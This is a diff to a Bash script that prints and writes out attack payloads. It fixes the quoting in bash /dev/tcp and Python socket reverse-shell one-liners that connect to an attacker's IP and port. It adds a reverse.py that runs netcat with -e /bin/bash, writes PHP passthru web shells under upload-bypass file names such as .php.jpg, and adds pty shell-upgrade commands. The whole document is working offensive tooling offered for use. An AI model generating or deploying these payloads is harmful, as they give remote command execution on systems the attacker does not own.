@@ -58,7 +58,7 @@ function bin_shell(){
 	 
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script Bash [1] \n \n "
-	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1 /n"
+	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1 "
 
 
 	elif [[ $category == 2 ]]; then
@@ -103,7 +103,7 @@ fi
 
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script Python [1] \n \n "
-	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($MY_IP,$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' " 
+	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" 
 	
 
 
@@ -115,11 +115,21 @@ fi
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo  "#!/usr/bin/env python " > $file1
 	echo -e "\n "
-	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($MY_IP,$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' "  >> $file1
+	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> $file1 
 	echo -e "\n "
 	echo -e "This is the script save by file name  [ $file1 ] "
 	chmod +x $file1
 
+	echo   "#!/usrbin/env python " >reverse.py 
+	echo   "import os" >>reverse.py
+	echo   "import sys" >>reverse.py
+	echo   "try:" >>reverse.py
+	echo   "	os.system('nc $MY_IP $MY_PORT -e /bin/bash ')" >>reverse.py
+	echo    "except:" >>reverse.py
+	echo    "	sys.exit()" >>reverse.py
+	chmod +x reverse.py
+	echo -e "\n "
+	echo -e "This is another script python that will be saved as [ reverse.py ] "
 
 	elif [[ $python ==  3 ]]; then
 	
@@ -321,14 +331,14 @@ fi
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [6] (passthru_2.php.jpg) \n"
-	echo  " <?php passthru(\$_GET['cmd']); ?> " >> passthru_2.php.jpg
+	echo  " <?php passthru(\$_GET['cmd']); ?> " > passthru_2.php.jpg
 	chmod +x  passthru_2.php.jpg
 
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script [7] passthru_3.PhP \n "
-	echo    "<?php passthru(\$_GET['cmd']); ?>" >> passthru_3.PhP
+	echo    "<?php passthru(\$_GET['cmd']); ?>" > passthru_3.PhP
 	chmod +x passthru_3.PhP
 
 	
@@ -358,4 +368,18 @@ fi
 	bin_shell
 	
 	echo -e "\n \n "
-	echo -e "$RED Thank you for use the my script !!! \n \n"	
+	
+	echo -e "\033[33;7m#######################################\e[0m \n \n ";
+
+	echo -e "This is the Spawn shell by python2 or python3 : \n"
+	 
+	echo   "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	echo -e "\n"
+	echo   "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	echo -e "\n"
+	echo -e "\033[33;7m#######################################\e[0m \n \n ";
+
+
+	
+	echo -e "$RED Thank you for using the script !!! ( Enjoy ) \n \n"
+		
